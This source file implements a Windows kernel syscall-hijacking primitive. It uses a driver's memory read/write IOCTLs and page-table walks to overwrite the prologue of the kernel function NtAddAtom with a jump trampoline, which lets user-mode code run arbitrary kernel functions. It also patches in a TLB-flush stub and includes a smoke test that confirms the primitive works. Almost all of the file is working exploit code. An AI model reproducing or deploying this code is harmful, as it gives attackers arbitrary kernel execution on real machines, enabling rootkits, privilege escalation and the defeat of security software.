#include "syscall_hijack.h"
#include "ioctl.h"
#include "ntapi.h"
#include "pagewalk.h"

#include <algorithm>
#include <cstdio>
#include <cstring>
#include <intrin.h>
#include <vector>

namespace {

constexpr uint8_t EXPECTED_PROLOGUE[7] = {
    0x48, 0x83, 0xEC, 0x28,   // sub rsp, 28h
    0x45, 0x33, 0xC9,         // xor r9d, r9d
    // followed by E8 <rel32> which we verify by resolving NtAddAtomEx
};

bool read_kva(const syscall_hijack::Context& ctx, uint64_t kva, void* dst, size_t size) {
    return ioctl::read_kernel_virtual(ctx.device, kva, dst, size);
}

bool write_kva(const syscall_hijack::Context& ctx, uint64_t kva, const void* src, size_t size) {
    const uint8_t* in = static_cast<const uint8_t*>(src);
    while (size) {
        uint64_t page_off = kva & 0xFFFULL;
        size_t chunk = std::min<size_t>(size, 0x1000 - page_off);
        uint64_t phys = 0;
        if (!pagewalk::va_to_phys(ctx.device, ctx.cr3, kva, phys)) return false;
        if (!ioctl::write_physical(ctx.device, phys, in, chunk)) return false;
        kva += chunk;
        in += chunk;
        size -= chunk;
    }
    return true;
}

struct RtlProcessModuleInformation {
    HANDLE  Section;
    PVOID   MappedBase;
    PVOID   ImageBase;
    ULONG   ImageSize;
    ULONG   Flags;
    USHORT  LoadOrderIndex;
    USHORT  InitOrderIndex;
    USHORT  LoadCount;
    USHORT  OffsetToFileName;
    UCHAR   FullPathName[256];
};

struct RtlProcessModules {
    ULONG                        NumberOfModules;
    RtlProcessModuleInformation  Modules[1];
};

constexpr ULONG SystemModuleInformation      = 11;
// STATUS_INFO_LENGTH_MISMATCH and PFN_NtQuerySystemInformation live in ntapi.h
// (added 2026-04-17 for handle-enum work). Don't redeclare here.

typedef BOOL  (WINAPI *PFN_EnumDeviceDrivers)(LPVOID*, DWORD, DWORD*);
typedef DWORD (WINAPI *PFN_GetDeviceDriverBaseNameA)(LPVOID, LPSTR, DWORD);

uint64_t try_k32_enum_device_drivers() {
    HMODULE kb32 = GetModuleHandleW(L"kernel32.dll");
    if (!kb32) return 0;
    auto ed = reinterpret_cast<PFN_EnumDeviceDrivers>(
        GetProcAddress(kb32, "K32EnumDeviceDrivers"));
    auto gb = reinterpret_cast<PFN_GetDeviceDriverBaseNameA>(
        GetProcAddress(kb32, "K32GetDeviceDriverBaseNameA"));
    if (!ed || !gb) {
        std::printf("[!] hijack: K32Enum*/K32GetDrvBaseName resolve failed\n");
        return 0;
    }

    LPVOID drivers[1024];
    DWORD cb_needed = 0;
    if (!ed(drivers, sizeof(drivers), &cb_needed)) {
        std::printf("[!] hijack: K32EnumDeviceDrivers err=%lu\n", GetLastError());
        return 0;
    }
    const int count = static_cast<int>(cb_needed / sizeof(LPVOID));
    std::printf("[*] hijack: K32EnumDeviceDrivers returned %d drivers\n", count);

    char nm[MAX_PATH];
    for (int i = 0; i < count; ++i) {
        if (gb(drivers[i], nm, MAX_PATH) &&
            _stricmp(nm, "ntoskrnl.exe") == 0) {
            return reinterpret_cast<uint64_t>(drivers[i]);
        }
    }
    if (count > 0) {
        std::printf("[*] hijack: ntoskrnl.exe not found by name; falling back to first driver\n");
        return reinterpret_cast<uint64_t>(drivers[0]);
    }
    return 0;
}

uint64_t try_nqsi_system_modules() {
    if (!ntapi::NtQuerySystemInformation) {
        std::printf("[!] hijack: ntapi::NtQuerySystemInformation not resolved\n");
        return 0;
    }

    std::vector<uint8_t> buf(0x8000);
    ULONG returned = 0;
    NTSTATUS s = 0;
    for (int attempt = 0; attempt < 6; ++attempt) {
        s = ntapi::NtQuerySystemInformation(
            SystemModuleInformation, buf.data(), static_cast<ULONG>(buf.size()), &returned);
        if (s >= 0) break;
        if (s == STATUS_INFO_LENGTH_MISMATCH) {
            buf.resize(returned > buf.size() ? returned + 0x1000 : buf.size() * 2);
            continue;
        }
        std::printf("[!] hijack: NQSI SystemModuleInformation status=0x%08X\n", static_cast<uint32_t>(s));
        return 0;
    }
    if (s < 0) return 0;

    auto mods = reinterpret_cast<const RtlProcessModules*>(buf.data());
    std::printf("[*] hijack: NQSI returned %lu modules\n", mods->NumberOfModules);
    if (mods->NumberOfModules == 0) return 0;
    for (ULONG i = 0; i < mods->NumberOfModules; ++i) {
        const auto& m = mods->Modules[i];
        const char* basename = reinterpret_cast<const char*>(m.FullPathName) + m.OffsetToFileName;
        if (_stricmp(basename, "ntoskrnl.exe") == 0) {
            return reinterpret_cast<uint64_t>(m.ImageBase);
        }
    }
    return reinterpret_cast<uint64_t>(mods->Modules[0].ImageBase);
}

uint64_t resolve_ntoskrnl_base() {
    if (uint64_t b = try_k32_enum_device_drivers(); b) return b;
    std::printf("[*] hijack: K32EnumDeviceDrivers path failed, trying NQSI...\n");
    return try_nqsi_system_modules();
}

} // namespace

namespace syscall_hijack {

uint64_t resolve_kernel_export(const Context& ctx, uint64_t mod_base_va, const char* name) {
    IMAGE_DOS_HEADER dos{};
    if (!read_kva(ctx, mod_base_va, &dos, sizeof(dos))) return 0;
    if (dos.e_magic != IMAGE_DOS_SIGNATURE) return 0;

    IMAGE_NT_HEADERS64 nt{};
    if (!read_kva(ctx, mod_base_va + dos.e_lfanew, &nt, sizeof(nt))) return 0;
    if (nt.Signature != IMAGE_NT_SIGNATURE) return 0;

    const auto& exp_dir = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exp_dir.Size == 0 || exp_dir.VirtualAddress == 0) return 0;

    IMAGE_EXPORT_DIRECTORY exp{};
    if (!read_kva(ctx, mod_base_va + exp_dir.VirtualAddress, &exp, sizeof(exp))) return 0;

    std::vector<uint32_t> names(exp.NumberOfNames ? exp.NumberOfNames : 1);
    std::vector<uint16_t> ords(exp.NumberOfNames ? exp.NumberOfNames : 1);
    std::vector<uint32_t> funcs(exp.NumberOfFunctions ? exp.NumberOfFunctions : 1);

    if (exp.NumberOfNames == 0 || exp.NumberOfFunctions == 0) return 0;

    if (!read_kva(ctx, mod_base_va + exp.AddressOfNames,
                  names.data(), exp.NumberOfNames * sizeof(uint32_t))) return 0;
    if (!read_kva(ctx, mod_base_va + exp.AddressOfNameOrdinals,
                  ords.data(), exp.NumberOfNames * sizeof(uint16_t))) return 0;
    if (!read_kva(ctx, mod_base_va + exp.AddressOfFunctions,
                  funcs.data(), exp.NumberOfFunctions * sizeof(uint32_t))) return 0;

    char cand[96];
    for (ULONG i = 0; i < exp.NumberOfNames; ++i) {
        if (!read_kva(ctx, mod_base_va + names[i], cand, sizeof(cand))) continue;
        cand[sizeof(cand) - 1] = 0;
        if (std::strcmp(cand, name) != 0) continue;

        uint16_t ord = ords[i];
        if (ord >= exp.NumberOfFunctions) return 0;
        uint32_t rva = funcs[ord];
        if (rva >= exp_dir.VirtualAddress &&
            rva <  exp_dir.VirtualAddress + exp_dir.Size) {
            return 0;  // forwarded export, not supported here
        }
        return mod_base_va + rva;
    }
    return 0;
}

bool init(HANDLE device, uint64_t cr3, Context& out) {
    out = {};
    out.device = device;
    out.cr3 = cr3;

    if (ntapi::RtlAdjustPrivilege) {
        BOOLEAN old = 0;
        ntapi::RtlAdjustPrivilege(20 /* SeDebugPrivilege */, TRUE, FALSE, &old);
    }

    out.ntoskrnl_base_va = resolve_ntoskrnl_base();
    if (!out.ntoskrnl_base_va) {
        std::printf("[!] hijack: resolve_ntoskrnl_base failed\n");
        return false;
    }

    out.nt_add_atom_kva = resolve_kernel_export(out, out.ntoskrnl_base_va, "NtAddAtom");
    if (!out.nt_add_atom_kva) {
        std::printf("[!] hijack: resolve kernel NtAddAtom failed\n");
        return false;
    }

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return false;
    out.ntdll_nt_add_atom_user =
        reinterpret_cast<uint64_t>(GetProcAddress(ntdll, "NtAddAtom"));
    if (!out.ntdll_nt_add_atom_user) {
        std::printf("[!] hijack: GetProcAddress(NtAddAtom) failed\n");
        return false;
    }

    std::printf("[+] hijack: ntoskrnl base         = %016llX\n",
                (unsigned long long)out.ntoskrnl_base_va);
    std::printf("[+] hijack: kernel NtAddAtom      = %016llX\n",
                (unsigned long long)out.nt_add_atom_kva);
    std::printf("[+] hijack: ntdll  NtAddAtom stub = %016llX\n",
                (unsigned long long)out.ntdll_nt_add_atom_user);
    return true;
}

bool invoke(const Context& ctx, uint64_t target_kva,
            uint64_t rcx, uint64_t rdx, uint64_t r8, uint64_t r9,
            uint64_t& rax_out) {
    uint8_t saved[12] = {};
    if (!read_kva(ctx, ctx.nt_add_atom_kva, saved, 12)) {
        std::printf("[!] hijack: read prologue failed (page non-resident or pagewalk error)\n");
        return false;
    }

    if (std::memcmp(saved, EXPECTED_PROLOGUE, 7) != 0 || saved[7] != 0xE8) {
        std::printf("[!] hijack: prologue mismatch — got ");
        for (int i = 0; i < 12; ++i) std::printf("%02X ", saved[i]);
        std::printf("\n");
        return false;
    }

    uint8_t trampoline[12];
    trampoline[0]  = 0x48;
    trampoline[1]  = 0xB8;
    std::memcpy(trampoline + 2, &target_kva, 8);
    trampoline[10] = 0xFF;
    trampoline[11] = 0xE0;

    HANDLE  thread       = GetCurrentThread();
    HANDLE  process      = GetCurrentProcess();
    int     old_thr_prio = GetThreadPriority(thread);
    DWORD   old_prc_cls  = GetPriorityClass(process);
    SetPriorityClass(process, HIGH_PRIORITY_CLASS);
    SetThreadPriority(thread, THREAD_PRIORITY_TIME_CRITICAL);

    typedef uint64_t (NTAPI *PFN_Raw)(uint64_t, uint64_t, uint64_t, uint64_t);
    auto user_stub = reinterpret_cast<PFN_Raw>(ctx.ntdll_nt_add_atom_user);

    bool wrote_trampoline = false;
    bool call_ok          = false;

    __try {
        if (write_kva(ctx, ctx.nt_add_atom_kva, trampoline, 12)) {
            wrote_trampoline = true;
            _mm_mfence();
            rax_out = user_stub(rcx, rdx, r8, r9);
            _mm_mfence();
            call_ok = true;
        } else {
            std::printf("[!] hijack: trampoline write failed\n");
        }
    }
    __finally {
        if (wrote_trampoline) {
            write_kva(ctx, ctx.nt_add_atom_kva, saved, 12);
            _mm_mfence();
        }
    }

    SetThreadPriority(thread, old_thr_prio);
    SetPriorityClass(process, old_prc_cls);
    return call_ok;
}

bool smoke_test(const Context& ctx, uint64_t kqpc_kva) {
    uint64_t r1 = 0, r2 = 0, r3 = 0;
    if (!invoke(ctx, kqpc_kva, 0, 0, 0, 0, r1)) return false;
    if (!invoke(ctx, kqpc_kva, 0, 0, 0, 0, r2)) return false;
    if (!invoke(ctx, kqpc_kva, 0, 0, 0, 0, r3)) return false;
    std::printf("[+] hijack smoke: KQPC returns %016llX %016llX %016llX\n",
                (unsigned long long)r1, (unsigned long long)r2, (unsigned long long)r3);
    bool monotonic = (r1 != 0) && (r2 > r1) && (r3 > r2);
    std::printf("    nonzero + monotonic: %s\n",
                monotonic ? "YES  ->  primitive works end-to-end"
                          : "NO   ->  primitive broken (see above)");
    return monotonic;
}

bool flush_tlb_range(const Context& ctx, uint64_t va_start, size_t size) {
    uint8_t saved[12] = {};
    if (!read_kva(ctx, ctx.nt_add_atom_kva, saved, 12)) {
        std::printf("[!] tlb_flush: read prologue failed\n");
        return false;
    }

    if (std::memcmp(saved, EXPECTED_PROLOGUE, 7) != 0 || saved[7] != 0xE8) {
        std::printf("[!] tlb_flush: prologue mismatch\n");
        return false;
    }

    uint8_t stub[12] = {
        0x0F, 0x01, 0x39,
        0x33, 0xC0,
        0xC3,
        0x90, 0x90, 0x90, 0x90, 0x90, 0x90
    };

    HANDLE  thread       = GetCurrentThread();
    HANDLE  process      = GetCurrentProcess();
    int     old_thr_prio = GetThreadPriority(thread);
    DWORD   old_prc_cls  = GetPriorityClass(process);
    DWORD_PTR old_affinity = SetThreadAffinityMask(thread, 1);
    SetPriorityClass(process, HIGH_PRIORITY_CLASS);
    SetThreadPriority(thread, THREAD_PRIORITY_TIME_CRITICAL);

    typedef uint64_t (NTAPI *PFN_Raw)(uint64_t, uint64_t, uint64_t, uint64_t);
    auto user_stub = reinterpret_cast<PFN_Raw>(ctx.ntdll_nt_add_atom_user);

    bool wrote_stub = false;
    int  flushed    = 0;

    __try {
        if (write_kva(ctx, ctx.nt_add_atom_kva, stub, 12)) {
            wrote_stub = true;
            _mm_mfence();

            uint64_t va_end = (va_start + size + 0xFFF) & ~0xFFFULL;
            va_start &= ~0xFFFULL;
            for (uint64_t va = va_start; va < va_end; va += 0x1000) {
                user_stub(va, 0, 0, 0);
                ++flushed;
            }
            _mm_mfence();
        } else {
            std::printf("[!] tlb_flush: stub write failed\n");
        }
    }
    __finally {
        if (wrote_stub) {
            write_kva(ctx, ctx.nt_add_atom_kva, saved, 12);
            _mm_mfence();
        }
    }

    SetThreadPriority(thread, old_thr_prio);
    SetPriorityClass(process, old_prc_cls);
    if (old_affinity) SetThreadAffinityMask(thread, old_affinity);

    std::printf("[+] TLB flushed: %d pages\n", flushed);
    return flushed > 0;
}

} // namespace syscall_hijack
